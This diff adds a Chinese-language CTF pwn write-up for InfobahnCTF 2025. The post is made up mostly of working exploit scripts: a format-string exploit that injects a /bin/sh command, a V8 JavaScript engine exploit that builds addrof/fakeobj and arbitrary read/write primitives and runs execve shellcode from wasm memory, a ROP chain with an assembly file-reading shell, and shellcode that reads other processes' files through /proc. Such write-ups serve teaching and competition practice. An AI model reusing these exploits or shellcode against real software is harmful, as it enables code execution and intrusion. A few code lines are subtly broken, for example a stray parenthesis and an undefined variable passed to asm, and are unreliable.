@@ -1,0 +1,1076 @@
+export const layout = "#components/Page.js";
+export const title = "Infobahn2025 Writeup";
+export const description = "";
+export const created = "2025-11-10T14:30:29+08:00";
+
+# InfobahnCTF2025 Pwn Writeup
+
+![ak](https://pic1.imgdb.cn/item/691187013203f7be00ed1b7c.png)
+
+~~难道他真是赋能哥~~
+
+
+## pwnset
+
+子进程里有一个白给的格式化字符串，思路是 strtoll -> system，然后 free -> strtoll。
+
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='info')
+context.terminal = "tmux splitw -h -l 65% -b".split()
+context.terminal = "kitten @ launch --location=before --cwd=current --bias=65".split()
+context.log_level = "debug"
+
+local = 0
+ip = "pwnset.challs.infobahnc.tf"
+port = 1337
+ELF_PATH="./chal"
+
+
+elf = ELF(ELF_PATH)
+# libc = ELF("./libc.so.6")
+script = '''
+file ./chal
+set follow-fork-mode child
+catch exec
+b syslog
+b system
+go
+'''
+
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript = script)
+    elif args.REMOTE:
+        return remote(ip, port)
+    else:
+        return process(elf.path)
+
+
+p = start()
+def dbg():
+    if local:
+        gdb.attach(p,script)
+    pause()
+
+def lg(buf):
+    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')
+
+
+payload = f'\';/bin/sh;\'%{0x8750-0xd-11}c%142$hn%{0x401200-0x8750}c%20$n'.ljust(0x28, '1').encode()+p64(0x403458)[0:3])
+
+pause()
+p.sendlineafter('>', '1')
+for i in range(0x100):
+    p.sendlineafter(':', payload)
+    p.sendlineafter(':', '4207784')
+    if b"Select" in p.recvrepeat(0.2):
+        p.sendline('1')
+    else:
+        break
+
+p.interactive()
+```
+
+1/16 爆破，远程需要一点耐心（~~说的就是你daimi~~）
+
+## book manager v2
+
+任意读写原语，随便打。
+
+
+## The Butterfly effect
+
+`magic` 方法存在一个 off by one 漏洞，可以溢出翻转一个 64 位数字的某个二进制位，但是只能用一次。
+
+感觉不太能翻转 `map`，通过翻转 `len` 字段构造一个无限溢出的 `double array`。
+
+
+```js
+/* Conversion code from https://github.com/google/google-ctf/blob/main/2018/finals/pwn-just-in-time/exploit/index.html */
+let conversion_buffer = new ArrayBuffer(8);
+let float_view = new Float64Array(conversion_buffer);
+let int_view = new BigUint64Array(conversion_buffer);
+
+BigInt.prototype.hex = function() {
+    return '0x' + this.toString(16);
+};
+
+BigInt.prototype.i2f = function() {
+    int_view[0] = this;
+    return float_view[0];
+}
+
+BigInt.prototype.smi2f = function() {
+    int_view[0] = this << 32n;
+    return float_view[0];
+}
+
+Number.prototype.f2i = function() {
+    float_view[0] = this;
+    return int_view[0];
+}
+
+Number.prototype.f2smi = function() {
+    float_view[0] = this;
+    return int_view[0] >> 32n;
+}
+
+Number.prototype.i2f = function() {
+    return BigInt(this).i2f();
+}
+
+Number.prototype.smi2f = function() {
+    return BigInt(this).smi2f();
+}
+function sleep(time){
+	var timeStamp = new Date().getTime();
+	var endTime = timeStamp + time;
+	while(true){
+		if (new Date().getTime() > endTime){
+			return;
+		}
+	}
+}
+function debug(objWrapper) {
+	const objName = Object.keys(objWrapper)[0];
+	const objValue = objWrapper[objName];
+	console.log(`--- Debugging: ${objName} ---`);
+	// %DebugPrint(objValue);
+	console.log(`--- End of: ${objName} ---`);
+}
+
+
+(function () {
+	"use strict";
+
+	function makePackedDoubleArray() {
+		return [13.37, 13.37, 13.37, 13.37].slice(0);
+	}
+	function makePackedArray() {
+		return [13.37, 13.37, 13.37, {}].slice(0);
+	}
+	const spraySize = 0x5000;
+	const spray = new Array(spraySize);
+
+	// for (let i = 0; i < 200000; i++) shellcode(0);
+
+	for (let i = 0; i < spraySize; i += 3) {
+		spray[i] = makePackedDoubleArray();
+		spray[i+1] = makePackedDoubleArray();
+		spray[i+2] = makePackedArray();
+	}
+
+	const corruptorIndex = 0x2000;
+	const c = spray[corruptorIndex];
+	const d = spray[corruptorIndex + 1];
+	const e = spray[corruptorIndex + 2];
+	// const f = [{}];
+	e.magic(e.length, 38);
+
+	const PACKED_DOUBLE_ELEMENTS_MAP_ADDR = 0x80b4f1n;
+	const PACKED_ELEMENTS_MAP_ADDR = 0x80b579n;
+	const FIXED_DOUBLE_ARRAY_TYPE = 0x911n;
+	const FIXED_ARRAY_TYPE = 0x5ddn;
+	const PROPERTIES_ADDR = 0x7bdn;
+
+
+	const test_obj = {};
+	d[35] = 13.37;
+	function addrof(obj) {
+		c[0] = obj;
+		let res = d[5].f2i();
+		return res & 0xffffffffn;
+	}
+
+	function fakeobj(addr) {
+		d[5] = ((addr << 32n) | addr).i2f();
+		return c[0];
+	}
+
+	let arbrw_arr = [1.1, 2.2, 3.3];
+	let fake_arr = [
+		((PROPERTIES_ADDR << 32n) | PACKED_DOUBLE_ELEMENTS_MAP_ADDR).i2f(), // 伪造好不变的字段
+		0x4141414141414141n.i2f() // 留出 length | elements 的空间
+	];
+	let fake_arr_addr = addrof(fake_arr);
+	console.log("fake_arr_addr =>", fake_arr_addr.hex());
+	let fake_arr_elements_addr = fake_arr_addr + 0x84n;
+	let arbrw_arr_addr = addrof(arbrw_arr);
+	console.log("arbrw_arr_addr =>", arbrw_arr_addr.hex());
+	fake_arr[1] = (8n << 32n | arbrw_arr_addr).i2f();
+
+	console.log("fake_arr_elements_addr =>", fake_arr_elements_addr.hex());
+	let fake_obj = fakeobj(fake_arr_elements_addr);
+
+
+
+	function write64(where, what) {
+		fake_obj[0] = (6n << 32n | (where)).i2f();
+		arbrw_arr[0] = what.i2f();
+	}
+	//
+	function read64(where) {
+		fake_obj[0] = (6n << 32n | (where)).i2f();
+		return arbrw_arr[0].f2i();
+	}
+
+    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+    var wasmModule = new WebAssembly.Module(wasmCode);
+    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+    var f = wasmInstance.exports.main;
+
+	let instance_addr = addrof(wasmInstance);
+	let trusted_data = read64(instance_addr) >> 32n;
+	console.log(trusted_data.hex());
+	let rwx = read64(trusted_data+0x20n);
+	console.log(rwx.hex());
+
+    var data_buf = new ArrayBuffer(0x400);
+    var data_view = new DataView(data_buf);
+	let backing = addrof(data_buf) + 0x18n + 0x4n;
+	let haddr = read64(backing);
+	console.log(backing.hex());
+	console.log(haddr.hex());
+
+	// %SystemBreak();
+
+	write64(backing, rwx);
+    let shellcode = [
+      0x2fbb485299583b6an,
+      0x5368732f6e69622fn,
+      0x050f5e5457525f54n
+        ];
+    for (let i = 0; i < shellcode.length; ++i)
+    {
+		data_view.setFloat64(i * 8, shellcode[i].i2f(), true);
+    }
+	// %SystemBreak();
+
+    f();
+})();
+```
+
+本来是想打 jit spray，但是似乎高版本里 `func->code` 在另一个 isolate 里，所以就打 wasm 了，远程没开 pkey protect.
+
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import argparse, sys, os
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("host")
+    ap.add_argument("port", type=int)
+    ap.add_argument("js")
+    ap.add_argument("--timeout", type=float, default=40.0)
+    ap.add_argument("--debug", action="store_true")
+    args = ap.parse_args()
+
+    if args.debug:
+        context.log_level = "debug"
+
+    # 以 UTF-8 文本读取，长度按“字符数”计算，匹配远端 start_d8.py 的 sys.stdin.read(size)
+    try:
+        script_str = open(args.js, "r", encoding="utf-8").read()
+    except Exception as e:
+        print(f"read js failed: {e}")
+        sys.exit(1)
+
+    size_chars = len(script_str)
+    if size_chars >= 20000:
+        print(f"payload too large (chars): {size_chars}")
+        sys.exit(1)
+    script_bytes = script_str.encode("utf-8")
+
+    io = remote(args.host, args.port, timeout=args.timeout)
+
+    # 握手：等待提示，发送长度（字符数）
+    io.recvuntil(b"Enter solve script file size:")
+    io.sendline(str(size_chars).encode())
+
+    # 等待上传提示，发送脚本正文（UTF-8 字节）
+    # io.recvuntil(b"Waiting for script content...")
+    pause()
+    io.send(script_bytes)
+
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+
+## pwn a brainrot
+
+没见过这个语言，扔给 AI 分析了一通，找到洞应该是整数溢出，从而导致数组越界。
+
+这样功能一二就相当于任意读写，程序没有开启任何保护。
+
+调试发现，可以任意读写 0xc00000c1e0 之后的内存，但是没有注意到比较好的结构体。
+
+写了一个在指定内存中搜索指定范围内指针的 gdb script：
+
+```python
+import gdb
+from pathlib import Path
+
+class FindPointer(gdb.Command):
+    """find_ptr START END LOW HIGH [CHUNK]"""
+
+    def __init__(self):
+        super().__init__("find_ptr", gdb.COMMAND_DATA)
+
+    def invoke(self, arg, from_tty):
+        argv = gdb.string_to_argv(arg)
+        if len(argv) < 4:
+            raise gdb.GdbError("usage: find_ptr start end low high [chunk_size]")
+        start = int(argv[0], 0)
+        end   = int(argv[1], 0)
+        low   = int(argv[2], 0)
+        high  = int(argv[3], 0)
+        chunk = int(argv[4], 0) if len(argv) > 4 else 0x4000
+        if end <= start:
+            raise gdb.GdbError("end must be larger than start")
+        if high <= low:
+            raise gdb.GdbError("high must be larger than low")
+
+        inferior = gdb.selected_inferior()
+        if inferior.pid is None:
+            raise gdb.GdbError("no running inferior")
+
+        addr = start
+        hits = 0
+        page = 0x1000
+
+        while addr < end:
+            size = min(chunk, end - addr)
+            try:
+                buf = inferior.read_memory(addr, size)
+            except gdb.MemoryError:
+                addr = ((addr // page) + 1) * page
+                continue
+
+            data = memoryview(buf)
+            for off in range(0, len(data) - 7, 8):
+                val = int.from_bytes(data[off:off+8], "little")
+                if low <= val < high:
+                    print(f"[hit] {addr+off:#x} -> {val:#x}")
+                    hits += 1
+            addr += size
+
+        print(f"[done] scanned {end-start:#x} bytes, hits={hits}")
+
+FindPointer()
+```
+
+挺好使的，然后直接用这个去搜索栈地址，发现还真有。然后打 rop 应该就结束了。
+
+but 环境似乎启用了 nsjail 导致无法 `execve("/bin/sh", 0, 0)`，打 orw 又得先 `getdents` 看远程文件名是什么。
+
+这里卡了很久，不知道为什么远程 `getdents` 看不到 flag 文件，其他文件都看到的。。
+
+最后 @Tplus 师傅给了我一个 mini-shell，确实很好用。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./brainrot"
+context.log_level = "info"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("brainrot.challs.infobahnc.tf", 1337) if argv[1] == 'r' else process(proc)
+# io = remote("127.0.0.1", 8081) if argv[1] == 'r' else process(proc)
+
+
+if args.G:
+    gdb.attach(io, """
+    # b* 0x62C7B0
+    c
+    """)
+
+
+def choose(idx):
+    io.sendlineafter(b">", str(idx).encode())
+
+
+def steal(idx, content):
+    choose(1)
+    io.sendlineafter(b"Brainrot index:", str(idx).encode())
+    io.sendlineafter(b"Which brainrot are you stealing?:", content)
+
+
+def check(idx):
+    choose(2)
+    io.sendlineafter(b"Brainrot index: ", str(idx).encode())
+
+
+def write64(addr, dest, src):
+    if addr < 0xc00000c1e0:
+        return
+    idx = (addr - 0xc00000c1e0) // 4
+    target = dest - src
+    if target > 0:
+        if (target > 67676767):
+            for i in range(target // 67676767):
+                print(i, idx)
+                steal(idx, b"Los 67")
+                # io.interactive()
+            target = target % 67676767
+        if (target > 1000000):
+            for i in range(target // 1000000):
+                print(i, idx)
+                steal(idx, b"Chimpanzini Bananini")
+            target = target % 1000000
+        if (target > 100000):
+            for i in range(target // 100000):
+                print(i, idx)
+                steal(idx, b"Orcalero Orcala")
+            target = target % 100000
+        if (target > 10000):
+            for i in range(target // 10000):
+                print(i, idx)
+                steal(idx, b"Odin Din Din Dun")
+            target = target % 10000
+        if (target > 1000):
+            for i in range(target // 1000):
+                print(i, idx)
+                steal(idx, b"Job Job Job Sahur")
+            target = target % 1000
+        if (target > 100):
+            for i in range(target // 100):
+                print(i, idx)
+                steal(idx, b"John Pork")
+            target = target % 100
+        if (target > 10):
+            for i in range(target // 10):
+                print(i, idx)
+                steal(idx, b"Ballerina Cappuccina")
+            target = target % 10
+        if (target >= 1):
+            for i in range(target // 1):
+                print(i, idx)
+                steal(idx, b"Meowl")
+            target = target % 1
+
+
+def read64(addr):
+    if addr < 0xc00000c1e0:
+        return
+    idx = (addr - 0xc00000c1e0) // 4
+    check(idx)
+    io.recvuntil(b"is generating $", drop=True)
+    low = int(io.recvuntil(b"/s\n", drop=True))
+    check(idx + 1)
+    io.recvuntil(b"is generating $", drop=True)
+    high = int(io.recvuntil(b"/s\n", drop=True))
+    leak = (high << 32) | (low)
+    return leak
+
+
+# 0xc00140c1e0
+io.sendlineafter(b"How large is your inventory?", str(0x4000000000000000 + 1).encode())
+check(0x2)
+leak1 = read64(0xc000012070) - 0x6a8
+log.info(f"leak1 => {hex(leak1)}")
+
+# steal(0, b"Los 67")
+# pause()
+
+for i in range(leak1 + 0x490, leak1 + 0x6a8, 8):
+    tmp = read64(i)
+    log.info(f"{hex(i)}: tmp => {hex(tmp)}")
+    if (tmp >> 36) == 0x7ff:
+        stack_addr = tmp
+        break
+
+# ead64(leak1)
+stack_addr += 0xa8
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+
+pop_rdi_ret = 0x0000000000647a5f
+pop_rsi_ret = 0x000000000064a120
+pop_rdx_ret = 0x0000000000662b1a
+pop_rax_ret = 0x0000000000662865
+syscall = 0x0000000000661ba0
+binsh = 0xc003fffc00
+pop_rax_rbx_ret = 0x000000000064fcaa
+dir = 0xc003fffc50
+flag_name = 0xc003fff12f
+ret = pop_rax_ret + 1
+push_rax_ret = 0x000000000062db0c
+
+reread = [pop_rsi_ret, stack_addr + 0x50, ret, pop_rdx_ret, 0x500, pop_rdi_ret, 0x0, syscall, ret, ret]
+rop = [pop_rdi_ret, stack_addr & 0xfffffffffffff000, pop_rsi_ret, 0x1000, pop_rdx_ret, 7, pop_rax_ret, 10, syscall, stack_addr + 0xa0]
+
+mini_shell = f"""
+entry:
+    lea rsp,[rip - 0x7]
+    mov rsp, {stack_addr - 0x968}
+    call mini_shell
+/* void gets(char*buffer) */
+gets:
+    push rbp
+    mov rbp,rsp
+
+    push rdi                    /*gets buffer*/
+    push 0x0                    /*temp buff*/
+readByte:
+    xor rdi,rdi
+    lea rsi,[rsp]               /*read one byte to buffer*/
+    mov rdx,1
+
+    xor rax,rax
+    syscall
+
+    cmp rax,1
+    jne  error
+
+    cmp byte ptr[rsp],0xa
+    je getsend
+    mov al,byte ptr[rsp]
+
+    mov rdi,rsp
+    add rdi,0x8
+    mov rdi,[rdi]
+
+    mov byte ptr [rdi], al
+
+    inc rdi
+    mov [rsp + 0x8],rdi         /*rdi++*/
+    jmp readByte
+
+getsend:
+    mov rdi,[rsp + 0x8]
+    mov byte ptr [rdi],0
+error:
+    leave
+    ret
+
+/* void print(char*string) */
+print:
+    push rbp
+    mov rbp,rsp
+    push rdi
+
+    call strlen
+    mov rdx,rax
+    mov rdi,1
+    mov rsi,[rsp]
+
+    mov rax,1
+    syscall
+    leave
+    ret
+/* int strlen(const char*s) */
+strlen:
+    push rbx
+    xor rax,rax
+
+    test rdi,rdi
+    je end
+loop:
+    mov bl,byte ptr [rdi]
+    test bl,bl
+    je end
+    inc rax
+    inc rdi
+    jmp loop
+end:
+    pop rbx
+    ret
+
+/* void cat(const char*filepath)*/
+cat:
+    push r8
+    push rbp
+    mov rbp,rsp
+
+    /* buffer */
+    sub rsp,0x100
+
+    /* open file */
+    xor rcx,rcx
+    mov rsi,rdi
+    xor rdx,rdx
+    mov edi,0xFFFFFF9C
+    call sys_openat2
+
+    cmp rax,-1
+    je open_failed
+    mov r8,rax
+/* loop of read*/
+loop_read:
+    mov rdi,r8
+    mov rsi,rsp
+    mov rdx,0x100
+
+    xor rax,rax
+    syscall
+
+    cmp rax,0
+    /* read eof or failed*/
+    jle open_failed
+
+    mov rdi,1
+    mov rsi,rsp
+    mov rdx,rax
+
+    mov rax,1
+    syscall
+
+    jmp loop_read
+open_failed:
+    leave
+    pop r8
+    ret
+
+/* void ls(const char*dir) */
+ls:
+    push r8
+    push rbp
+    mov rbp,rsp
+    /* buffer */
+    sub rsp,0x200
+
+
+    xor rcx,rcx
+    mov rdx,65536
+    mov rsi,rdi
+    mov edi,0xFFFFFF9C
+    call sys_openat2
+
+    cmp rax,-1
+    je ls_failed
+
+    mov r8,rax
+/* loop read dir */
+loop_read_dir:
+    mov rdi,r8
+    mov rsi,rsp
+    mov rdx,0x200
+
+    mov rax,78
+    syscall
+
+    cmp rax,0
+    jle ls_failed
+
+    /* r9: nRead */
+    mov r9,rax
+
+    /* show infos in buffer */
+    xor rcx,rcx
+show_file_in_buffer:
+    lea rdi,[rsp + rcx + 16]
+    xor rax,rax
+    mov ax,word ptr [rdi]
+    add rcx,rax
+    add rdi,2
+    push rcx
+    call print
+
+    /* dir of regular file*/
+    mov rcx,[rsp]
+
+    mov al,byte ptr [rsp + rcx + 7]
+    cmp al,0x4
+    mov rax,0xa
+    mov rdx,1
+    jne out_split_char
+    / * out char '/' */
+    mov rax,0xa2f
+    inc rdx
+out_split_char:
+    push rax
+    mov rdi,1
+    mov rsi,rsp
+
+    mov rax,1
+    syscall
+    add rsp,8
+    pop rcx
+    cmp rcx,r9
+
+    jb show_file_in_buffer
+
+    /* all file in buffer has been listed */
+    jmp loop_read_dir
+
+ls_failed:
+    leave
+    pop r8
+    ret
+
+mini_shell:
+    sub rsp,0x200
+    mov dword ptr[rsp],0x242f
+loop_exec_cmd:
+    /* show current work dir*/
+    mov rdi,rsp
+    call print
+    /* get user's command */
+    lea rdi,[rsp + 0x100]
+    call gets
+    /* switch command */
+if_ls:
+    mov eax,[rsp + 0x100]
+    and eax,0x00ffffff
+    cmp eax,0x20736c
+    jne if_cat
+
+    lea rdi,[rsp + 0x103]
+    call ls
+    jmp loop_exec_cmd
+if_cat:
+    mov eax,[rsp + 0x100]
+    and eax,0xffffffff
+    cmp eax,0x20746163
+    jne loop_exec_cmd
+
+    lea rdi,[rsp + 0x104]
+    call cat
+    jmp loop_exec_cmd
+
+    /* dfd,filename,flag,mode */
+sys_openat2:
+    push r10
+    sub rsp,0x18
+
+    xor rax,rax
+    /*how */
+    mov [rsp + 0x0],rdx
+    mov [rsp + 0x8],rcx
+    mov [rsp + 0x10],rax
+    lea rdx,[rsp]
+
+    /* size */
+    push 0x18
+    pop r10
+
+    mov rax, SYS_openat2
+    syscall
+
+    add rsp,0x18
+    pop r10
+    ret
+
+sys_openat:
+    push r10
+    mov r10,rcx
+    mov rax, SYS_openat
+    syscall
+    pop r10
+    ret
+"""
+
+orw = asm(orw)
+
+src = [0x6348d6, stack_addr + 0x50, 0x662343, 0x66231b, 0, 0, 0, 0, 0x624ba6, 1]
+
+write64(0xc003fffc00, 0x6873, 0)
+write64(dir, 0x2f2e2e, 0)
+
+for i in range(len(reread)):
+    write64(stack_addr + i * 8, reread[i], src[i])
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+choose(3)
+io.sendline(flat(rop) + asm(mini_shell))
+io.interactive()
+```
+
+
+## quintuple-read
+
+小众变态题目，牢完了。
+
+题意很简单，要求用五种完全不同的字节集实现读取 flag.txt，我搓 orw 搓了三个半，分别是：
+
+1. stage A: 0~0x1f 用[这篇文章](https://www.anquanke.com/post/id/256530)提到的技术
+2. stage B: 用 `mov rdi, rdx` + `stosb`
+3. stage C: 只使用 `push` `pop`
+4. stage D：搓不动了.jpg
+
+
+太牢了我日，受不了，考虑非预期。
+
+```python
+while True:
+   for i in range(1, 100000):
+      read(open(f"/proc/{i}/cwd/flag", O_RDONLY), 'rsp', 0x100)
+      write(open(f"/proc/{i}/fd/1", O_WRONLY), 'rsp', 0x100)
+```
+
+题目的权限没配置好，不同进程的用户都是同一个，可以跨进程读文件。
+
+那就设置两个进程 A、B，其中 A 进程只需要保持 1 ~ 2s 的睡眠，B 进程在这段时间内遍历 `pid` 然后读取 `/proc/{i}/cwd/flag`
+
+显然要先启动 A 再启动 B，不然只会读取到 B 进程的 flag 就退出了。
+
+重复五次上述操作，就可以 leak 5 个 flag 碎片出来。所以只需要用五种不同的字符集实现 `sleep` 就行了，具体就是用一些有限次数的循环来实现。
+
+很变态的是远程的机器 cpu MHz 为 2800.218，而我本地有 5600+，所以本地跑起来会快很多，这题基本上没办法在本地测试，远程又是静态靶机，受到网络环境和其他选手的影响，这个“有限次数的循环”并不是那么好把控。
+
+```python
+from pwn import *
+from sys import argv
+import textwrap
+
+proc = "./binary"
+context.log_level = "debug"
+context.binary = proc
+
+
+def getio():
+    io = remote("quintuple-read.challs.infobahnc.tf", 1337)
+    return io
+
+
+# 这个函数通过读取远程的 /proc/self/stat 获取当前的 pid，缩小 pid 遍历范围
+def getpid():
+    io1 = getio()
+    io1.sendlineafter(b"/5):", b"48b801010101010101015048b86d672e72756075014831042448b82f70726f632f7365504889e731d231f66a02580f054889c731c031d2b6104889e60f056a015f4889c24889e66a01580f05")
+    io1.recvuntil(b"stdout: b'")
+    pid = int(io1.recvuntil(b" (binary) R", drop=True).decode())
+    io1.close()
+    return pid
+
+
+PROC_STR = b"/proc/"
+TAIL_STR = b"/cwd/flag.txt"
+PREFIX_STR = b"[+] Found flag from PID "
+SUFFIX_STR = b": "
+NOW_FLAG_STR = b"now flag"
+
+
+def search_flag(
+    start_pid,
+    end_pid: int,
+    buf_size: int = 0x100,
+) -> bytes:
+    if start_pid < 0 or end_pid < 0:
+        raise ValueError("start_pid and end_pid must be non-negative")
+    if start_pid > end_pid:
+        raise ValueError("start_pid must be <= end_pid")
+
+    open_sc = shellcraft.open('rdi', 0, 0)
+    read_sc = shellcraft.read('rdi', 'r15', buf_size)
+    write_prefix = shellcraft.write(1, 'rsi', len(PREFIX_STR))
+    write_suffix = shellcraft.write(1, 'rsi', len(SUFFIX_STR))
+    write_digits = shellcraft.write(1, 'r8', 'rbp')
+    write_payload = shellcraft.write(1, 'r15', 'r11')
+    write_newline = shellcraft.write(1, 'rsi', 1)
+    write_now_flag = shellcraft.write(1, 'rsi', len(NOW_FLAG_STR))
+
+    asm_code = f"""
+        cld
+        sub rsp, 0x200
+        mov r13, rsp              /* path buffer */
+        lea r14, [r13 + 0x40]     /* digits scratch */
+        lea r15, [r14 + 0x20]     /* read buffer */
+        mov r12d, {start_pid}     /* current PID */
+        mov r10d, {end_pid}       /* max PID */
+    loop_start:
+        mov eax, r12d
+        mov ecx, 10
+        lea r9, [r14 + 0x10]
+        mov byte ptr [r9], 0
+        mov r8, r9
+    build_digits:
+        xor edx, edx
+        div ecx
+        add dl, '0'
+        dec r8
+        mov [r8], dl
+        test eax, eax
+        jnz build_digits
+        mov rdx, r9
+        sub rdx, r8
+        mov rbp, rdx              /* digit count */
+        lea rdi, [r13]
+        lea rsi, [rip + proc_str]
+        mov ecx, {len(PROC_STR)}
+        rep movsb
+        mov rsi, r8
+        mov rcx, rbp
+        rep movsb
+        lea rsi, [rip + tail_str]
+        mov ecx, {len(TAIL_STR)}
+        rep movsb
+        mov byte ptr [rdi], 0
+        mov rdi, r13
+{open_sc}
+        test rax, rax
+        js next_pid
+        mov rbx, rax              /* fd */
+        mov rdi, rbx
+{read_sc}
+        mov r11, rax              /* bytes read */
+        cmp r11, 0
+        jle next_pid
+        lea rsi, [rip + prefix_str]
+{write_prefix}
+        mov rsi, r8
+{write_digits}
+        lea rsi, [rip + suffix_str]
+{write_suffix}
+        mov rsi, r15
+{write_payload}
+        lea rsi, [rip + newline_str]
+{write_newline}
+        jmp print_local
+    next_pid:
+        inc r12d
+        cmp r12d, r10d
+        jle loop_start
+        mov r12d, {start_pid}
+        jmp loop_start
+    print_local:
+        lea rsi, [rip + now_flag_str]
+{write_now_flag}
+        lea rsi, [rip + newline_str]
+{write_newline}
+    """
+
+    asm_code += shellcraft.open("./flag.txt\x00", 0, 0)
+    asm_code += shellcraft.read('rax', 'r15', buf_size)
+    asm_code += shellcraft.write(1, 'r15', 'rax')
+    asm_code += "        ud2\n"
+
+    asm_code += f"""
+    proc_str:
+        .ascii "{PROC_STR.decode()}"
+    tail_str:
+        .ascii "{TAIL_STR.decode()}"
+    prefix_str:
+        .ascii "{PREFIX_STR.decode()}"
+    suffix_str:
+        .ascii "{SUFFIX_STR.decode()}"
+    newline_str:
+        .byte 0x0a
+    now_flag_str:
+        .ascii "{NOW_FLAG_STR.decode()}"
+    """
+
+    return asm(asm_code)
+
+
+TOTAL_PREFIX = b"total cycles: "
+AVG_PREFIX = b"avg cycles: "
+
+
+pid = getpid()
+sc1 = bytes.hex(asm("mov ecx, 0x05b9b9b9; loop_here: loop loop_here;")).encode()  # 0x04b9b9b9 可以改
+sc2 = bytes.hex(asm("push 0x131A1A1A; pop rcx; loop_dec: dec rcx; jnz loop_dec")).encode()  # 0x121A1A1A 可以改
+sc3 = bytes.hex(asm("add ecx, 0x388b0d0d") + asm("loop_eq: cmp al, al; loope loop_eq;")).encode()  # \x8b\x0d\x8b\xe1 可以
+sc4 = bytes.hex(asm("""
+nop
+nop
+nop
+jrcxz  done
+sub    cl, 1
+mov    edx, 0x03090909
+inner:
+    sub    edx, 1
+    test   edx, edx
+    jg     inner
+    jmp    short $-0x13
+    nop
+done:
+""")).encode()  # 0x03090909 可以改
+# loop_start:
+#     inc ecx
+#     inc ecx
+#     loopne loop_start
+sc5 = bytes.hex(asm("""
+        mov     ebx, 0x33333333
+        mov     ecx, ebx
+loop5:  or      al, 0x33
+        or      al, 0x33
+        loopne  loop5
+""")).encode() # 0x33333333 可以改
+print(pid)
+search = bytes.hex(search_flag(pid, pid + 0x800)).encode()
+p1 = getio()
+p2 = getio()
+
+print(sc1)
+print(sc2)
+print(sc3)
+print(sc4)
+print(sc5)
+p1.recvuntil(b"/5):")
+p2.recvuntil(b"/5):")
+p1.sendline(sc1)
+p2.sendline(search)
+res1 = p2.recvline()
+p2.close()
+log.info(res1)
+
+p2 = getio()
+p1.recvuntil(b"/5):")
+p2.recvuntil(b"/5):")
+p1.sendline(sc2)
+p2.sendline(search)
+res2 = p2.recvline()
+p2.close()
+log.info(res2)
+
+
+p2 = getio()
+p1.recvuntil(b"/5):")
+p2.recvuntil(b"/5):")
+p1.sendline(sc3)
+p2.sendline(search)
+res3 = p2.recvline()
+p2.close()
+log.info(res3)
+
+
+p2 = getio()
+p1.recvuntil(b"/5):")
+p2.recvuntil(b"/5):")
+p1.sendline(sc4)
+p2.sendline(search)
+res4 = p2.recvline()
+p2.close()
+log.info(res4)
+
+
+p2 = getio()
+p1.recvuntil(b"/5):")
+p2.recvuntil(b"/5):")
+p1.sendline(sc5)
+p2.sendline(search)
+res5 = p2.recvline()
+p2.close()
+log.info(res5)
+#
+p1.interactive()
+```
+
+
+exp 如上，我实现的 `search_flag` 函数可以生成一个在 `[start_pid, end_pid]` 范围内用于搜索目标进程的 PID 的 shellcode，如果搜到了就打印出来，并且把当前这个进程 B 的 flag.txt 用 orw 打印出来（“now flag”），只需要对比这俩一不一样就知道泄漏成功了没有（如果一样说明读到自己了）。
+
+然后就是很折磨的调试循环次数，一直调，我刚打这题的时候 pid 只有 1000 左右，后面打到 8000 了直接。。。经常是对 4 个错一个。
+
+去找主办方重启了一下远程靶机，然后试了一会就出了。
+
+泄漏出来的五组 flag 碎片直接扔给 AI 恢复即可。
+
+![](https://pic1.imgdb.cn/item/691192fb3203f7be00ed228c.png)
+
+这个题预期解是：
+
+> Each payload needed a unique way of jumping back to the start so you can use `jmp <reg>, ret, ret XXX, retfq, retfq XXX` (using 0x49 instead of 0x48 as the first byte).
+
+
+## 后记
+
+![](https://pic1.imgdb.cn/item/691193263203f7be00ed22a4.png)
+
+> 👴：黑子说话用英语怎么说 有没有人懂.jpg
